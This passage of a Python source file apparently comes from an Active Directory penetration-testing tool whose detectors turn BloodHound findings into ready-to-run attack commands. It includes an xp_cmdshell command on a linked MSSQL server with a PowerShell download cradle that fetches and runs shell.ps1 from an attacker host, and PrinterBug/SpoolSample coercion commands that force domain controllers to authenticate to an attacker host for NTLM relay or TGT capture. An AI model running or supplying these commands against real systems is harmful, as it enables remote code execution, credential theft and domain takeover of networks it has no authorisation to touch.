                            "in that server's security context.",
            ),
            AttackCommand(
                command=f"crackmapexec mssql {target} -u '{user}' -p '{password}' -q \"EXEC ('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>]\"",
                description="Execute OS command via xp_cmdshell on linked server",
                explanation="Confirms code execution context on the linked server. Replace 'whoami' "
                            "with a PowerShell download-cradle or reverse shell one-liner for "
                            "full shell access.",
                alternatives=[
                    "EXEC ('xp_cmdshell ''powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://<LHOST>/shell.ps1\\\")\"''') AT [<LINKED_SERVER>]",
                ],
                references=[
                    "https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/",
                ],
            ),
        ]


class PrintSpoolerDetector(DetectorBase):
    """
    Detect Print Spooler service running on domain controllers.

    The MS-RPRN protocol (Print Spooler) exposes RpcRemoteFindFirstPrinterChangeNotification,
    which can be triggered by any authenticated user to force the DC to authenticate to
    an attacker-controlled host. Combined with unconstrained delegation or NTLM relay,
    this achieves domain compromise.

    Known as: PrinterBug, SpoolSample
    CVE: No CVE assigned (by-design protocol behavior)

    Reference: https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-df0724100
               https://github.com/leechristopher/SpoolSample
               https://github.com/dirkjanm/krbrelayx
    """

    @property
    def indicator_name(self) -> str:
        return "print_spooler"

    @property
    def display_name(self) -> str:
        return "Print Spooler Service (Coercion Target)"

    @property
    def description(self) -> str:
        return "Print Spooler enables PrinterBug/SpoolSample coercion for NTLM relay or unconstrained delegation abuse."

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        # BloodHound CE does not reliably track spooler service state.
        # Flag all DCs as candidates - spooler has historically been on by default.
        evidence = []
        query = """
        MATCH (c:Computer)
        WHERE c.unconstraineddelegation = true
        RETURN c.name AS name
        LIMIT 20
        """
        try:
            result = neo4j_session.run(query)
            for record in result:
                name = record.get('name') or ''
                evidence.append(f"Unconstrained delegation host (likely DC): {name} - verify spooler via rpcdump")
        except Exception:
            pass
        # Always surface this check for DCs - spooler runs by default on all supported Windows versions
        evidence.append(
            "All DCs should be tested for MS-RPRN availability - Print Spooler runs by default"
        )
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.POSSIBLE,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Confirm MS-RPRN is exposed via rpcdump",
                "Set up Responder or krbrelayx to capture/relay coerced authentication",
                "Trigger coercion from any authenticated domain account",
            ],
            references=[
                "https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-df0724100",
                "https://github.com/dirkjanm/krbrelayx",
                "https://github.com/leechristopher/SpoolSample",
            ],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        target = context.get('target_ip', '<TARGET>')
        domain = context.get('domain', '<DOMAIN>')
        user = context.get('username', '<USER>')
        password = context.get('password', '<PASS>')
        attacker = context.get('lhost', '<ATTACKER_HOST>')
        return [
            AttackCommand(
                command=f"python3 rpcdump.py @{target} | grep MS-RPRN",
                description="Check if Print Spooler (MS-RPRN) is accessible",
                explanation="rpcdump.py (impacket) lists all RPC endpoints. MS-RPRN present "
                            "means the spooler pipe is reachable and coercion is possible. "
                            "Absence does not guarantee safety - the service may still respond "
                            "over named pipes.",
                prerequisites=["impacket installed", "Network access to target RPC port (135)"],
                references=["https://github.com/fortra/impacket"],
            ),
            AttackCommand(
                command=f"python3 SpoolSample.py {target} {attacker}",
                description="Trigger DC authentication to attacker host via PrinterBug",
                explanation="SpoolSample calls RpcRemoteFindFirstPrinterChangeNotification on the "
                            "target DC, forcing it to authenticate to <attacker_host>. The resulting "
                            "TGT (if attacker has unconstrained delegation) or Net-NTLMv2 hash "
                            "(if using Responder/NTLM relay) can be captured and abused.",
                prerequisites=[
                    "Valid domain credentials",
                    "Listener running on attacker host (Responder, ntlmrelayx, or krbrelayx)",
                ],
                references=["https://github.com/leechristopher/SpoolSample"],
                alternatives=[
                    f"python3 printerbug.py {domain}/{user}:{password}@{target} {attacker}",
                    f"Invoke-SpoolSample -Target {target} -CaptureServer {attacker}  # PowerShell",
                ],
            ),
            AttackCommand(
                command=f"python3 printerbug.py {domain}/{user}:{password}@{target} {attacker}",
                description="Alternative coercion tool with credential support",
                explanation="printerbug.py (dirkjanm) wraps the same MS-RPRN abuse with explicit "
                            "credential passing, useful when you have plaintext creds but no Kerberos "
                            "ticket. Pair with krbrelayx on the attacker host for TGT capture when "
                            "a host with unconstrained delegation is the listener.",
                prerequisites=["Valid domain credentials", "krbrelayx or Responder listening on attacker host"],
                references=[
                    "https://github.com/dirkjanm/krbrelayx",
                    "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/",
                ],
            ),
        ]


class DetectorRegistry:
    """
    Registry of attack vector detectors.

    Runs all registered detectors and aggregates results.
    """

    def __init__(self):
        self._detectors: List[DetectorBase] = []

    def register(self, detector: DetectorBase) -> "DetectorRegistry":
        """Register a detector (chainable)."""
        self._detectors.append(detector)
        return self

    def detect_all_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> List[DetectionResult]:
        """Run all detectors against LDAP data."""
        results = []
        for detector in self._detectors:
            result = detector.detect_from_ldap(users, groups, computers, context)
            if result:
                results.append(result)
        return results

    def detect_all_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> List[DetectionResult]:
        """Run all detectors against BloodHound data."""
        results = []
        for detector in self._detectors:
            result = detector.detect_from_bloodhound(neo4j_session, context)
            if result:
                results.append(result)
        return results

    def list_detectors(self) -> List[Dict[str, str]]:
        """List all registered detectors."""
        return [
            {
                "indicator": d.indicator_name,
                "name": d.display_name,
                "description": d.description,
            }
            for d in self._detectors
        ]


def get_default_registry() -> DetectorRegistry:
    """Get registry with all default detectors."""
    registry = DetectorRegistry()
    registry.register(AzureADConnectDetector())
    registry.register(GPPPasswordDetector())
    registry.register(LAPSDetector())
    registry.register(DnsAdminsDetector())
    registry.register(ServerOperatorsDetector())
    registry.register(PrintOperatorsDetector())
    registry.register(MSSQLLinkedServerDetector())
    registry.register(PrintSpoolerDetector())
    return registry
